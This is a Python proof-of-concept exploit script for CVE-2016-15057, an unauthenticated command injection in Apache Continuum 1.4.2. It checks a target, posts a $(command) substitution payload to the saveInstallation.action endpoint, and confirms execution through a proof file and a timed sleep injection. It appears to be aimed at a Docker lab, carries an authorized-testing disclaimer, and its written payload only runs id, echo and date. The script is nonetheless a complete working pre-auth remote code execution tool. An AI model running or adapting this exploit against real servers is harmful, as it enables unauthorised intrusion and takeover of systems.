#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : Apache Continuum 1.4.2 - Unauthenticated Command Injection ($(cmd) Substitution)
# CVE            : CVE-2016-15057
# Vendor         : Apache Software Foundation
# Product        : Apache Continuum
# Affected       : All versions (up to 1.4.2)
# Type           : CWE-77 - Command Injection
# CVSS           : 9.9 (Critical)
# Platform       : Linux
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2026-02-28
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
PoC for CVE-2016-15057: Apache Continuum Command Injection

Demonstrates unauthenticated OS command injection in Apache Continuum 1.4.2
via the saveInstallation.action endpoint. The 'installation.varValue' POST
parameter is passed unsanitized to /bin/sh -c via plexus-utils Commandline.

The injection occurs during Struts2 validation (InstallationValidator) which
executes BEFORE the authorization interceptor, making this a pre-auth RCE.

Primary vector: $(command) substitution (passes regex validation cleanly)

Usage:
    python3 poc.py <target_host> [port]
    python3 poc.py 172.19.0.6 8080
"""
import sys
import time
import http.client
import urllib.parse


# ANSI colors for terminal output
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
BOLD = "\033[1m"
RESET = "\033[0m"

DEFAULT_HOST = "172.19.0.6"
DEFAULT_PORT = 8080
TIMEOUT = 30

# Unique marker to prove command execution
PROOF_FILE = "/tmp/cve_2016_15057_proof"


def banner():
    print(f"""{BOLD}{CYAN}
╔══════════════════════════════════════════════════════╗
║  CVE-2016-15057 — Apache Continuum Command Injection ║
║  Vector: $(command) substitution (pre-auth)          ║
╚══════════════════════════════════════════════════════╝{RESET}
""")


def check_target(host, port):
    """Step 1: Verify the target is running Apache Continuum."""
    print(f"{CYAN}[*] Step 1: Checking target http://{host}:{port}/continuum/{RESET}")
    try:
        conn = http.client.HTTPConnection(host, port, timeout=TIMEOUT)
        conn.request("GET", "/continuum/")
        resp = conn.getresponse()
        body = resp.read().decode("utf-8", errors="replace")
        conn.close()

        if resp.status in (200, 302) and ("continuum" in body.lower() or "Continuum" in resp.getheader("Location", "")):
            print(f"{GREEN}[+] Target appears to be running Apache Continuum (HTTP {resp.status}){RESET}")
            return True
        else:
            print(f"{YELLOW}[!] Unexpected response (HTTP {resp.status}). Target may not be Continuum.{RESET}")
            return True  # Continue anyway
    except Exception as e:
        print(f"{RED}[-] Cannot connect to target: {e}{RESET}")
        return False


def inject_command(host, port, command, install_name="poc_test", install_type="jdk"):
    """
    Step 2: Inject a command via $(command) substitution.

    Sends POST to /continuum/saveInstallation.action with:
      - installation.name = arbitrary non-empty string
      - installation.type = jdk (triggers immediate execution via getExecutorConfiguratorVersion)
      - installation.varValue = $(COMMAND)

    The $(COMMAND) passes the regex validator since $, (, ) are allowed characters.
    During validation, InstallationValidator calls getExecutorConfiguratorVersion() which
    constructs "$(COMMAND)/bin/java" and executes it via /bin/sh -c, triggering command substitution.
    """
    payload = f"$({command})"
    print(f"{CYAN}[*] Step 2: Injecting command via $(command) substitution{RESET}")
    print(f"    Endpoint: POST /continuum/saveInstallation.action")
    print(f"    Payload:  installation.varValue={payload}")
    print(f"    Type:     {install_type}")

    # URL-encode the form body
    form_data = urllib.parse.urlencode({
        "installation.name": install_name,
        "installation.type": install_type,
        "installation.varValue": payload,
    })

    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
    }

    try:
        conn = http.client.HTTPConnection(host, port, timeout=TIMEOUT)
        conn.request("POST", "/continuum/saveInstallation.action", body=form_data, headers=headers)
        resp = conn.getresponse()
        body = resp.read()
        conn.close()

        print(f"    Response: HTTP {resp.status} ({len(body)} bytes)")
        return resp.status, body
    except Exception as e:
        print(f"{RED}[-] Request failed: {e}{RESET}")
        return None, None


def verify_execution(host, port, container_name="cve-2016-15057-vulnerable"):
    """
    Step 3: Verify command execution by checking the proof file.

    Since the injection is blind (output not reflected in HTTP response),
    we verify by reading the file created by the injected command.
    """
    import subprocess

    print(f"\n{CYAN}[*] Step 3: Verifying command execution{RESET}")

    # Try reading the proof file from the container
    try:
        result = subprocess.run(
            ["docker", "exec", container_name, "cat", PROOF_FILE],
            capture_output=True, text=True, timeout=10
        )
        if result.returncode == 0 and result.stdout.strip():
            proof = result.stdout.strip()
            print(f"{GREEN}{BOLD}[+] COMMAND INJECTION CONFIRMED!{RESET}")
            print(f"{GREEN}[+] Proof file contents ({PROOF_FILE}):{RESET}")
            print(f"    {proof}")
            return True, proof
        else:
            print(f"{RED}[-] Proof file not found or empty{RESET}")
            if result.stderr:
                print(f"    Error: {result.stderr.strip()}")
            return False, None
    except subprocess.TimeoutExpired:
        print(f"{RED}[-] Timeout reading proof file{RESET}")
        return False, None
    except FileNotFoundError:
        print(f"{YELLOW}[!] Docker not available. Cannot verify via container exec.{RESET}")
        return False, None


def time_based_verify(host, port, delay=5):
    """
    Alternative verification: time-based blind injection.

    Injects $(sleep N) and measures response time to confirm execution.
    """
    print(f"\n{CYAN}[*] Time-based verification: injecting $(sleep {delay}){RESET}")

    start = time.time()
    status, _ = inject_command(host, port, f"sleep {delay}", install_name="time_check")
    elapsed = time.time() - start

    print(f"    Response time: {elapsed:.1f}s (expected >= {delay}s if vulnerable)")

    if elapsed >= delay - 1:  # Allow 1s tolerance
        print(f"{GREEN}[+] Time-based injection confirmed! Response delayed by ~{elapsed:.1f}s{RESET}")
        return True
    else:
        print(f"{YELLOW}[!] Response was fast ({elapsed:.1f}s). Time-based check inconclusive.{RESET}")
        return False


def cleanup(container_name="cve-2016-15057-vulnerable"):
    """Clean up proof files from the container."""
    import subprocess
    try:
        subprocess.run(
            ["docker", "exec", container_name, "rm", "-f", PROOF_FILE],
            capture_output=True, timeout=10
        )
    except Exception:
        pass


def exploit(target_host, target_port):
    """Run the full exploit chain against the target."""
    banner()

    # Step 1: Verify target
    if not check_target(target_host, target_port):
        print(f"{RED}[-] Target check failed. Aborting.{RESET}")
        return False

    # Clean up any previous proof files
    cleanup()

    # Step 2: Inject command to write proof file
    # Using 'id' to show we can execute arbitrary commands and capture output
    command = f"id > {PROOF_FILE} && echo CVE-2016-15057 >> {PROOF_FILE} && date >> {PROOF_FILE}"
    status, body = inject_command(target_host, target_port, command)

    if status is None:
        print(f"{RED}[-] Injection request failed. Aborting.{RESET}")
        return False

    # Brief pause to allow command execution to complete
    time.sleep(2)

    # Step 3: Verify via file read
    confirmed, proof = verify_execution(target_host, target_port)

    # Step 4: Additional time-based verification
    time_confirmed = time_based_verify(target_host, target_port, delay=5)

    # Summary
    print(f"\n{'='*60}")
    if confirmed:
        print(f"{GREEN}{BOLD}[✓] VULNERABILITY CONFIRMED: CVE-2016-15057{RESET}")
        print(f"{GREEN}    Unauthenticated command injection in Apache Continuum 1.4.2{RESET}")
        print(f"{GREEN}    Vector: $(command) substitution in installation.varValue{RESET}")
        print(f"{GREEN}    Execution context: {proof.splitlines()[0] if proof else 'unknown'}{RESET}")
    elif time_confirmed:
        print(f"{YELLOW}{BOLD}[~] VULNERABILITY LIKELY: CVE-2016-15057{RESET}")
        print(f"{YELLOW}    Time-based verification succeeded but file proof not available{RESET}")
    else:
        print(f"{RED}{BOLD}[✗] VERIFICATION FAILED{RESET}")
        print(f"{RED}    Could not confirm command injection{RESET}")
    print(f"{'='*60}")

    return confirmed or time_confirmed


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_HOST
    port = int(sys.argv[2]) if len(sys.argv) > 2 else DEFAULT_PORT

    success = exploit(target, port)
    sys.exit(0 if success else 1)
